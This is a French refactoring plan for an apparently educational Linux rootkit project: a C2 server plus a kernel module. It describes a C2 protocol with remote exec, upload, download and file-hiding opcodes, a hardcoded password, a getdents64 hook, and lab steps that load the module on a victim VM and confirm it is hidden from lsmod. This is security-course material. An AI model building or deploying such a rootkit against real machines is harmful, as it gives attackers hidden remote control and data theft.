@@ -1,0 +1,177 @@
+# WLKOM — Plan de refactoring complet
+Date: 2026-06-22
+
+## Vue d'ensemble du projet
+
+Rootkit pédagogique Linux en deux parties :
+- `attacking_program/` : Serveur C2 (userspace, C99)
+- `rootkit/`           : Module noyau Linux (LKM, kbuild)
+
+---
+
+## Architecture cible
+
+```
+attacking_program/
+├── Makefile
+├── include/
+│   ├── commands.h
+│   └── server.h
+├── src/
+│   ├── main.c
+│   ├── server.c
+│   └── commands.c
+└── tests/
+    ├── test_server.c
+    └── test_commands.c
+
+rootkit/
+├── Makefile
+├── include/
+│   ├── connect.h
+│   ├── hide.h
+│   └── persist.h
+└── src/
+    ├── main.c
+    ├── connect.c
+    ├── hide.c
+    └── persist.c
+```
+
+---
+
+## Protocole C2 <-> Rootkit
+
+```
+[1 byte : opcode]
+[4 bytes: longueur payload (big endian)]
+[N bytes: payload XOR-chiffre]
+```
+
+Opcodes :
+- 0x01 CMD_AUTH
+- 0x02 CMD_EXEC
+- 0x03 CMD_UPLOAD
+- 0x04 CMD_DOWNLOAD
+- 0x05 CMD_HIDE_FILE
+- 0x06 CMD_UNHIDE_FILE
+- 0x07 CMD_HIDE_LINE
+- 0x08 CMD_UNHIDE_LINE
+- 0x09 CMD_PING
+- 0x0A CMD_PONG
+
+Auth flow :
+  C2 -> rootkit : CMD_AUTH(real_password)
+  rootkit -> C2 : CMD_AUTH("OK") ou CMD_AUTH("FAIL")
+
+Password : "wlk0m_s3cr3t" (plaintext dans connect.h, chiffre Cesar dans server.h)
+
+---
+
+## Etapes de refactoring (dans l'ordre)
+
+### ETAPE 1 - attacking_program : structure et headers
+Problemes :
+- src/commands.h et src/server.h sont des doublons des include/
+- Les #include dans les .c utilisent "server.h" (pas "../include/server.h")
+- Makefile : -I./include mais les fichiers src incluent sans chemin relatif
+
+Actions :
+1. Supprimer src/commands.h et src/server.h
+2. Dans chaque .c de src/, remplacer #include "server.h" -> #include "../include/server.h"
+3. Verifier que le Makefile compile correctement
+
+Validation : make -C attacking_program doit compiler sans erreur
+
+---
+
+### ETAPE 2 - attacking_program : conformite C99 EPITA
+Problemes :
+- Declarations de variables apres des instructions (ex: for (size_t i...))
+- Commentaires partout (interdit sauf WHY non-evident)
+- Fonctions >40 lignes (server.c : handle_client, server_run)
+- Pas de cast explicite
+
+Actions :
+1. Deplacer toutes les declarations en debut de bloc
+2. Supprimer les commentaires decoratifs
+3. Decouper les fonctions trop longues
+4. Verifier -std=c99 -pedantic -Werror -Wall -Wextra -Wvla
+
+Validation : make -C attacking_program sans warning
+
+---
+
+### ETAPE 3 - attacking_program : tests (TDD Criterion)
+Tests a ecrire :
+
+tests/test_server.c :
+- send_packet / recv_packet sur socketpair (3 cas : normal, payload vide, deconnexion)
+- check_password : bon mdp, mauvais mdp, EOF (3 cas)
+
+tests/test_commands.c :
+- dispatch : commande ping, exec, commande inconnue (3 cas)
+- commands_loop : sortie sur "exit" (2 cas)
+
+Validation : make check -C attacking_program passe tous les tests
+
+---
+
+### ETAPE 4 - rootkit : structure et headers
+Problemes :
+- Headers dans src/ mais Makefile a ccflags-y += -I$(PWD)/include
+- Dossier include/ inexistant dans rootkit/
+
+Actions :
+1. Creer rootkit/include/
+2. Deplacer connect.h, hide.h, persist.h de src/ vers include/
+3. Les .c utilisent #include "connect.h" qui sera trouve via -I$(PWD)/include
+
+Validation : make -C rootkit compile le .ko
+
+---
+
+### ETAPE 5 - rootkit : conformite normes (adapte kernel)
+Note : Le code noyau n'est pas C99 strict (GCC kernel).
+Interdictions EPITA adaptees :
+- Pas de declarations apres instructions dans les blocs
+- Pas de commentaires decoratifs
+- Fonctions <40 lignes : decouper connect.c:handle_packet, hide.c:hooked_getdents64
+
+Validation : make -C rootkit sans warnings supplementaires
+
+---
+
+### ETAPE 6 - Tests d'integration manuels
+Procedure :
+1. Lancer ./attacking_program/wlkom_c2 4444 sur la machine attaquante
+2. Sur la VM victime : sudo insmod rootkit/wlkom.ko c2_ip=<IP> c2_port=4444
+3. Verifier dans le C2 : connexion + authentification OK
+4. Tester chaque commande : ping, exec ls, hide_file /tmp/test, download, upload
+5. Verifier lsmod | grep wlkom -> vide (module cache)
+
+---
+
+### ETAPE 7 - Nettoyage final
+- README a jour avec instructions de compilation et deploiement
+- .gitignore complet (*.o, *.ko, *.mod.c, Module.symvers, etc.)
+- AUTHORS mis a jour
+
+---
+
+## Etat actuel (2026-06-22)
+
+| Composant                   | Etat        | Priorite |
+|-----------------------------|-------------|----------|
+| attacking_program structure | A corriger  | HAUTE    |
+| attacking_program C99       | A corriger  | HAUTE    |
+| attacking_program tests     | A ecrire    | HAUTE    |
+| rootkit structure           | A corriger  | HAUTE    |
+| rootkit C99                 | A corriger  | MOYENNE  |
+| Tests integration           | A faire     | BASSE    |
+
+Commencer par : ETAPE 1
+
+
+# Mes notes 
+1) setup vms : ok, but do not call setup attacker and victim... 
